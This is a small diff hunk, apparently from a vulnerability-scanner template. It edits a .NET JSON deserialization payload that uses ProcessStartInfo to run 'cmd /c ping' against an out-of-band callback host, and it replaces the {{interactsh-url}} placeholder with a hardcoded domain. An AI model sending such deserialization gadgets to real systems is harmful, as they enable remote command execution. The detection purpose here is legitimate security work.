@@ -31,7 +31,7 @@ http:
             "StartInfo":{
               "__type":"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
               "FileName":"cmd",
-              "Arguments":"/c ping {{interactsh-url}}"
+              "Arguments":"/c ping interactsh-url.com"
             }
             }
           }
